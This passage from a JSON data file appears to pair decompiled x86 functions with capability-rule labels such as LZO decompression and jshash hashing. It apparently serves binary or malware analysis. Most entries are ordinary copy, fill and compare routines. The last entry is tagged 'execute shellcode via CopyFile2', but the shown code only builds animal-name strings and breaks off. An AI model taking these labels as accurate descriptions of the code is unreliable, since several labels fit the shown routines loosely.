            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00410770(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t noname_0;\n    uint unaff_ESI;\n    uint *puVar3;\n    uint unaff_EDI;\n    int32_t *piVar4;\n    uint unaff_retaddr;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.004270cf();\n    }\n    noname_0 = *(param_2 + 0x14) - param_3;\n    if (param_4 < noname_0) {\n        noname_0 = param_4;\n    }\n    if (param_1 != param_2) {\n        if (noname_0 == 0xffffffff) {\n            fcn.00427127();\n        }\n        if (*(param_1 + 0x18) < noname_0) {\n            fcn.004103f0(noname_0, *(param_1 + 0x14), unaff_EDI, unaff_ESI, unaff_EBP, unaff_EBX, unaff_retaddr, param_2\n                         , param_3, param_4);\n        }\n        else if (noname_0 == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (noname_0 != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            else {\n                param_2 = *(param_2 + 4);\n            }\n            piVar1 = param_1 + 4;\n            piVar4 = piVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar4 = *piVar1;\n            }\n            puVar3 = param_3 + param_2;\n            for (uVar2 = noname_0 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *piVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            for (uVar2 = noname_0 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *piVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                piVar4 = piVar4 + 1;\n            }\n            *(param_1 + 0x14) = noname_0;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar1 = *piVar1;\n            }\n            *(piVar1 + noname_0) = 0;\n        }\n        return param_1;\n    }\n    fcn.00410370(noname_0 + param_3, 0xffffffff);\n    fcn.00410370(0, param_3);\n    return param_1;\n}\n",
        "token_count": 782
    },
    "004108d0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004108d0(int32_t param_1, uint *param_2, uint32_t param_3, uint param_4)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    \n    uVar4 = *(param_1 + 0x18);\n    if (uVar4 < 0x10) {\n        puVar1 = param_1 + 4;\n    }\n    else {\n        puVar1 = *(param_1 + 4);\n    }\n    if (puVar1 <= param_2) {\n        puVar1 = param_1 + 4;\n        puVar3 = puVar1;\n        if (0xf < uVar4) {\n            puVar3 = *puVar1;\n        }\n        if (param_2 < *(param_1 + 0x14) + puVar3) {\n            if (0xf < uVar4) {\n                puVar1 = *puVar1;\n            }\n            iVar2 = fcn.00410770(param_1, param_2 - puVar1, param_3);\n            return iVar2;\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.00427127();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.004103f0(param_3, *(param_1 + 0x14), unaff_EBP, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_2, \n                     param_3, param_4);\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (*(param_1 + 0x18) < 0x10) {\n            *(param_1 + 4) = 0;\n            return param_1;\n        }\n        **(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            puVar1 = param_1 + 4;\n        }\n        else {\n            puVar1 = *(param_1 + 4);\n        }\n        for (uVar4 = param_3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = *param_2;\n            param_2 = param_2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n        for (uVar4 = param_3 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar1 = *param_2;\n            param_2 = param_2 + 1;\n            puVar1 = puVar1 + 1;\n        }\n        *(param_1 + 0x14) = param_3;\n        if (0xf < *(param_1 + 0x18)) {\n            *(*(param_1 + 4) + param_3) = 0;\n            return param_1;\n        }\n        *(param_1 + 4 + param_3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 782
    },
    "0041b0f0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041b0f0(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x0041b2b4;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x41b3d8\n            switch(*((arg_10h & 3) * 4 + 0x41b3d8)) {\n            case 0x41b3f0:\ncode_r0x0041b3f0:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x41b400:\ncode_r0x0041b400:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x41b414:\ncode_r0x0041b414:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x41b3d8\n            switch(*(arg_10h * 4 + 0x41b3d8)) {\n            case 0x41b3f0:\n                goto code_r0x0041b3f0;\n            case 0x41b400:\n                goto code_r0x0041b400;\n            case 0x41b414:\n                goto code_r0x0041b414;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x41b2dc)) {\n            case 0x41b2ec:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x0041b2b4:\n    // WARNING: Could not recover jumptable at 0x0041b2b6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x41b388\n                    puVar1 = (**(uVar3 * -4 + 0x41b388))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x41b3d8)) {\n                case 0x41b3f0:\n                    goto code_r0x0041b3f0;\n                case 0x41b400:\n                    goto code_r0x0041b400;\n                case 0x41b414:\n                    goto code_r0x0041b414;\n                }\n                break;\n            case 0x41b310:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x0041b2b4;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x41b3d8)) {\n                case 0x41b3f0:\n                    goto code_r0x0041b3f0;\n                case 0x41b400:\n                    goto code_r0x0041b400;\n                case 0x41b414:\n                    goto code_r0x0041b414;\n                }\n                break;\n            case 0x41b338:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x0041b2b4;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x41b3d8)) {\n                case 0x41b3f0:\n                    goto code_r0x0041b3f0;\n                case 0x41b400:\n                    goto code_r0x0041b400;\n                case 0x41b414:\n                    goto code_r0x0041b414;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x0041b14c;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x41b23c\n        switch(*((arg_10h & 3) * 4 + 0x41b23c)) {\n        case 0x41b254:\ncode_r0x0041b254:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x41b260:\ncode_r0x0041b260:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x41b274:\ncode_r0x0041b274:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x41b24c)) {\n        case 0x41b254:\n            goto code_r0x0041b254;\n        case 0x41b260:\n            goto code_r0x0041b260;\n        case 0x41b274:\n            goto code_r0x0041b274;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x41b150)) {\n        case 0x41b160:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x0041b14c:\n    // WARNING: Could not recover jumptable at 0x0041b14c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x41b1d0\n                puVar1 = (**(uVar2 * 4 + 0x41b1d0))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x41b23c)) {\n            case 0x41b254:\n                goto code_r0x0041b254;\n            case 0x41b260:\n                goto code_r0x0041b260;\n            case 0x41b274:\n                goto code_r0x0041b274;\n            }\n            break;\n        case 0x41b18c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x0041b14c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x41b23c)) {\n            case 0x41b254:\n                goto code_r0x0041b254;\n            case 0x41b260:\n                goto code_r0x0041b260;\n            case 0x41b274:\n                goto code_r0x0041b274;\n            }\n            break;\n        case 0x41b1b0:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x0041b14c;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x41b23c)) {\n            case 0x41b254:\n                goto code_r0x0041b254;\n            case 0x41b260:\n                goto code_r0x0041b260;\n            case 0x41b274:\n                goto code_r0x0041b274;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2755
    },
    "0041c370": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041c370(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar1 = (arg_10h - 4) + arg_8h;\n        if ((puVar1 & 3) == 0) {\n            uVar3 = arg_10h >> 2;\n            if (uVar3 < 8) goto code_r0x0041c534;\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar1 = puVar1 + -1;\n            }\n    // switch table (4 cases) at 0x41c658\n            switch(*((arg_10h & 3) * 4 + 0x41c658)) {\n            case 0x41c670:\ncode_r0x0041c670:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x41c680:\ncode_r0x0041c680:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x41c694:\ncode_r0x0041c694:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                *(puVar1 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x41c658\n            switch(*(arg_10h * 4 + 0x41c658)) {\n            case 0x41c670:\n                goto code_r0x0041c670;\n            case 0x41c680:\n                goto code_r0x0041c680;\n            case 0x41c694:\n                goto code_r0x0041c694;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar1 & 3);\n            switch(*((puVar1 & 3) * 4 + 0x41c55c)) {\n            case 0x41c56c:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar3 = arg_10h >> 2;\n                puVar1 = puVar1 - 1;\n                if (uVar3 < 8) {\ncode_r0x0041c534:\n    // WARNING: Could not recover jumptable at 0x0041c536. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x41c608\n                    puVar1 = (**(uVar3 * -4 + 0x41c608))();\n                    return puVar1;\n                }\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x41c658)) {\n                case 0x41c670:\n                    goto code_r0x0041c670;\n                case 0x41c680:\n                    goto code_r0x0041c680;\n                case 0x41c694:\n                    goto code_r0x0041c694;\n                }\n                break;\n            case 0x41c590:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar1 = puVar1 - 2;\n                if (uVar3 < 8) goto code_r0x0041c534;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x41c658)) {\n                case 0x41c670:\n                    goto code_r0x0041c670;\n                case 0x41c680:\n                    goto code_r0x0041c680;\n                case 0x41c694:\n                    goto code_r0x0041c694;\n                }\n                break;\n            case 0x41c5b8:\n                *(puVar1 + 3) = *(arg_ch + 3);\n                *(puVar1 + 2) = *(arg_ch + 2);\n                uVar3 = arg_10h >> 2;\n                *(puVar1 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar1 = puVar1 - 3;\n                if (uVar3 < 8) goto code_r0x0041c534;\n                for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar1 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar1 = puVar1 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x41c658)) {\n                case 0x41c670:\n                    goto code_r0x0041c670;\n                case 0x41c680:\n                    goto code_r0x0041c680;\n                case 0x41c694:\n                    goto code_r0x0041c694;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar1 = arg_8h;\n    if ((arg_8h & 3) == 0) {\n        uVar2 = arg_10h >> 2;\n        if (uVar2 < 8) goto code_r0x0041c3cc;\n        for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n            *puVar1 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            puVar1 = puVar1 + 1;\n        }\n    // switch table (4 cases) at 0x41c4bc\n        switch(*((arg_10h & 3) * 4 + 0x41c4bc)) {\n        case 0x41c4d4:\ncode_r0x0041c4d4:\n            *puVar1 = *arg_ch;\n            return arg_8h;\n        case 0x41c4e0:\ncode_r0x0041c4e0:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            return arg_8h;\n        case 0x41c4f4:\ncode_r0x0041c4f4:\n            *puVar1 = *arg_ch;\n            *(puVar1 + 1) = *(arg_ch + 1);\n            *(puVar1 + 2) = *(arg_ch + 2);\n            return arg_8h;\n        }\n    }\n    else if (arg_10h < 4) {\n        switch(*((arg_10h - 4) * 4 + 0x41c4cc)) {\n        case 0x41c4d4:\n            goto code_r0x0041c4d4;\n        case 0x41c4e0:\n            goto code_r0x0041c4e0;\n        case 0x41c4f4:\n            goto code_r0x0041c4f4;\n        }\n    }\n    else {\n        uVar3 = (arg_10h - 4) + (arg_8h & 3);\n        switch(*((arg_8h & 3) * 4 + 0x41c3d0)) {\n        case 0x41c3e0:\n            *arg_8h = *arg_ch;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 2) = *(arg_ch + 2);\n            arg_ch = arg_ch + 3;\n            puVar1 = arg_8h + 3;\n            if (uVar2 < 8) {\ncode_r0x0041c3cc:\n    // WARNING: Could not recover jumptable at 0x0041c3cc. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x41c450\n                puVar1 = (**(uVar2 * 4 + 0x41c450))();\n                return puVar1;\n            }\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x41c4bc)) {\n            case 0x41c4d4:\n                goto code_r0x0041c4d4;\n            case 0x41c4e0:\n                goto code_r0x0041c4e0;\n            case 0x41c4f4:\n                goto code_r0x0041c4f4;\n            }\n            break;\n        case 0x41c40c:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            *(arg_8h + 1) = *(arg_ch + 1);\n            arg_ch = arg_ch + 2;\n            puVar1 = arg_8h + 2;\n            if (uVar2 < 8) goto code_r0x0041c3cc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x41c4bc)) {\n            case 0x41c4d4:\n                goto code_r0x0041c4d4;\n            case 0x41c4e0:\n                goto code_r0x0041c4e0;\n            case 0x41c4f4:\n                goto code_r0x0041c4f4;\n            }\n            break;\n        case 0x41c430:\n            *arg_8h = *arg_ch;\n            uVar2 = uVar3 >> 2;\n            arg_ch = arg_ch + 1;\n            puVar1 = arg_8h + 1;\n            if (uVar2 < 8) goto code_r0x0041c3cc;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar1 = puVar1 + 1;\n            }\n            switch(*((uVar3 & 3) * 4 + 0x41c4bc)) {\n            case 0x41c4d4:\n                goto code_r0x0041c4d4;\n            case 0x41c4e0:\n                goto code_r0x0041c4e0;\n            case 0x41c4f4:\n                goto code_r0x0041c4f4;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 2769
    },
    "0041cc60": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t * fcn.0041cc60(uint32_t *param_1, uint8_t param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    \n    if (param_3 == 0) {\n        return param_1;\n    }\n    uVar1 = param_2;\n    puVar4 = param_1;\n    if (3 < param_3) {\n        uVar2 = -param_1 & 3;\n        uVar3 = param_3;\n        if (uVar2 != 0) {\n            uVar3 = param_3 - uVar2;\n            do {\n                *puVar4 = param_2;\n                puVar4 = puVar4 + 1;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        uVar1 = uVar1 * 0x1010101;\n        param_3 = uVar3 & 3;\n        uVar3 = uVar3 >> 2;\n        if (uVar3 != 0) {\n            for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = uVar1;\n                puVar4 = puVar4 + 1;\n            }\n            if (param_3 == 0) {\n                return param_1;\n            }\n        }\n    }\n    do {\n        *puVar4 = uVar1;\n        puVar4 = puVar4 + 1;\n        param_3 = param_3 - 1;\n    } while (param_3 != 0);\n    return param_1;\n}\n",
        "token_count": 387
    },
    "0041ccc0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint32_t fcn.0041ccc0(uint32_t *param_1, uint32_t *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    bool bVar9;\n    \n    uVar3 = param_3;\n    if (param_3 != 0) {\n        if (((param_1 | param_2) & 3) == 0) {\n            uVar3 = param_3 & 3;\n            param_3 = param_3 >> 2;\n            bVar9 = param_3 == 0;\n            puVar7 = param_1;\n            puVar8 = param_2;\n            if (!bVar9) {\n                do {\n                    param_1 = puVar7;\n                    param_2 = puVar8;\n                    if (param_3 == 0) break;\n                    param_3 = param_3 - 1;\n                    param_2 = puVar8 + 1;\n                    param_1 = puVar7 + 1;\n                    bVar9 = *puVar7 == *puVar8;\n                    puVar7 = param_1;\n                    puVar8 = param_2;\n                } while (bVar9);\n                if (!bVar9) {\n                    uVar3 = param_1[-1];\n                    uVar1 = param_2[-1];\n                    bVar9 = uVar3 < uVar1;\n                    if (((uVar3 == uVar1) &&\n                        (uVar5 = uVar3 >> 8,  uVar6 = uVar1 >> 8,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) &&\n                       (uVar5 = uVar3 >> 0x10,  uVar6 = uVar1 >> 0x10,  bVar9 = uVar5 < uVar6,  uVar5 == uVar6)) {\n                        bVar9 = uVar3 >> 0x18 < uVar1 >> 0x18;\n                    }\n                    goto code_r0x0041cd40;\n                }\n            }\n            if (uVar3 != 0) {\n                uVar1 = *param_1;\n                uVar2 = *param_2;\n                bVar9 = uVar1 < uVar2;\n                if (uVar1 != uVar2) {\ncode_r0x0041cd40:\n                    return (1 - bVar9) - (bVar9 != 0);\n                }\n                uVar4 = uVar3 - 1;\n                if (uVar4 != 0) {\n                    uVar5 = uVar2 >> 8;\n                    uVar6 = uVar1 >> 8;\n                    bVar9 = uVar6 < uVar5;\n                    if (uVar6 != uVar5) goto code_r0x0041cd40;\n                    uVar4 = uVar3 - 2;\n                    if (uVar4 != 0) {\n                        bVar9 = (uVar1 & 0xff0000) < (uVar2 & 0xff0000);\n                        if ((uVar1 & 0xff0000) != (uVar2 & 0xff0000)) goto code_r0x0041cd40;\n                        uVar4 = uVar3 - 3;\n                    }\n                }\n                return uVar4;\n            }\n        }\n        else {\n            if ((param_3 & 1) == 0) goto code_r0x0041ccf3;\n            bVar9 = *param_1 < *param_2;\n            if (*param_1 != *param_2) goto code_r0x0041cd40;\n            param_1 = param_1 + 1;\n            param_2 = param_2 + 1;\n            for (param_3 = param_3 - 1; uVar3 = param_3,  param_3 != 0; param_3 = param_3 - 2) {\ncode_r0x0041ccf3:\n                bVar9 = *param_1 < *param_2;\n                if ((*param_1 != *param_2) ||\n                   (bVar9 = *(param_1 + 1) < *(param_2 + 1),  *(param_1 + 1) != *(param_2 + 1))) goto code_r0x0041cd40;\n                param_2 = param_2 + 2;\n                param_1 = param_1 + 2;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1050
    },
    "00401d80": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00401d80(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    char **in_FS_OFFSET;\n    int32_t iVar5;\n    int32_t iStack228;\n    char *pcStack224;\n    char *apcStack220 [4];\n    uint uStack204;\n    uint uStack200;\n    char *pcStack196;\n    char *pcStack192;\n    char *pcStack188;\n    char *pcStack184;\n    char *pcStack180;\n    char *pcStack176;\n    char *pcStack172;\n    char *pcStack168;\n    char *pcStack164;\n    uint uStack160;\n    char *pcStack156;\n    char *pcStack152;\n    char *pcStack148;\n    char *pcStack144;\n    char *pcStack140;\n    char *pcStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack120;\n    uchar uStack116;\n    uint uStack108;\n    uchar uStack104;\n    uchar uStack100;\n    char cStack96;\n    uchar uStack92;\n    uchar uStack88;\n    uchar uStack84;\n    uchar uStack80;\n    uchar uStack76;\n    uchar uStack72;\n    uchar uStack68;\n    uchar uStack64;\n    uchar uStack60;\n    uchar uStack56;\n    uchar uStack52;\n    uchar uStack48;\n    uchar uStack44;\n    uchar uStack40;\n    uchar uStack36;\n    uchar uStack32;\n    uchar uStack28;\n    uchar uStack24;\n    uchar uStack20;\n    uchar uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x434ddc;\n    uStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    uStack128 = 0x4375fc;\n    uStack120 = 0;\n    uStack132 = 0x401dae;\n    fcn.00401cd0();\n    uStack132 = 0x4375f8;\n    uStack8 = 1;\n    pcStack136 = 0x401dc4;\n    fcn.00401cd0();\n    pcStack136 = \"wolf\";\n    uStack12 = CONCAT31(uStack12._1_3_, 2);\n    pcStack140 = 0x401dd7;\n    fcn.00401cd0();\n    pcStack140 = \"tiger\";\n    uStack16 = 3;\n    pcStack144 = 0x401dea;\n    fcn.00401cd0();\n    pcStack144 = \"lion\";\n    uStack20 = 4;\n    pcStack148 = 0x401dfd;\n    fcn.00401cd0();\n    pcStack148 = \"fish\";\n    uStack24 = 5;\n    pcStack152 = 0x401e10;\n    fcn.00401cd0();\n    pcStack152 = \"crocodile\";\n    uStack28 = 6;\n    pcStack156 = 0x401e23;\n    fcn.00401cd0();\n    pcStack156 = \"moose\";\n    uStack32 = 7;\n    uStack160 = 0x401e36;\n    fcn.00401cd0();\n    uStack160 = 0x4375c0;\n    uStack36 = 8;\n    pcStack164 = 0x401e49;\n    fcn.00401cd0();\n    pcStack164 = \"bird\";\n    uStack40 = 9;\n    pcStack168 = 0x401e5c;\n    fcn.00401cd0();\n    pcStack168 = \"shark\";\n    uStack44 = 10;\n    pcStack172 = 0x401e6f;\n    fcn.00401cd0();\n    pcStack172 = \"whale\";\n    uStack48 = 0xb;\n    pcStack176 = 0x401e82;\n    fcn.00401cd0();\n    pcStack176 = \"killer fish\";\n    uStack52 = 0xc;\n    pcStack180 = 0x401e95;\n    fcn.00401cd0();\n    pcStack180 = \"bear\";\n    uStack56 = 0xd;\n    pcStack184 = 0x401ea8;\n    fcn.00401cd0();\n    pcStack184 = \"snail\";\n    uStack60 = 0xe;\n    pcStack188 = 0x401ebb;\n    fcn.00401cd0();\n    pcStack188 = \"worm\";\n    uStack64 = 0xf;\n    pcStack192 = 0x401ece;\n    fcn.00401cd0();\n    uStack68 = 0x10;\n    pcStack192 = \"zebra\";\n    pcStack196 = 0x401ee1;\n    fcn.00401cd0();\n    pcStack196 = \"horse\";\n    uStack72 = 0x11;\n    uStack200 = 0x401ef4;\n    fcn.00401cd0();\n    uStack200 = 0x437570;\n    uStack76 = 0x12;\n    uStack204 = 0x401f07;\n    fcn.00401cd0();\n    uStack204 = 0x43756c;\n    uStack80 = 0x13;\n    apcStack220[3] = 0x401f1a;\n    fcn.00401cd0();\n    apcStack220[3] = 0x437568;\n    uStack84 = 0x14;\n    